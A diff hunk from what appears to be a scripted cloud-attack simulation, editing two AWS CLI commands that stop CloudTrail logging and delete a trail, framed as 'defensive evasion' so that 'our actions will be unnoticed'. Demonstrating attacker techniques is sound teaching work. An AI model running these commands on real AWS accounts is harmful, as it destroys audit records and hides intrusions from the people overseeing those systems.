@@ -551,8 +551,8 @@ We can list all the available trails in the region.
 Can we disable them? This way our actions will be unnoticed!
 EOF
 
-simulate_command 'aws cloudtrail stop-logging --name $(aws cloudtrail list-trails --no-paginate --region us-east-1 | jq -r '.Trails[].Name') --region us-east-1' 1 1 1
-simulate_command 'aws cloudtrail delete-trail --name $(aws cloudtrail list-trails --no-paginate --region us-east-1 | jq -r '.Trails[].Name') --region us-east-1' 1 1 1
+simulate_command 'aws cloudtrail stop-logging --name $(aws cloudtrail list-trails --no-paginate --region us-east-1 | jq -r '.Trails[1].Name') --region us-east-1' 1 1 1
+simulate_command 'aws cloudtrail delete-trail --name $(aws cloudtrail list-trails --no-paginate --region us-east-1 | jq -r '.Trails[1].Name') --region us-east-1' 1 1 1
 
 show_message_box "DEFENSIVE EVASION" "CloudTrail logs have been disable successfully."
 
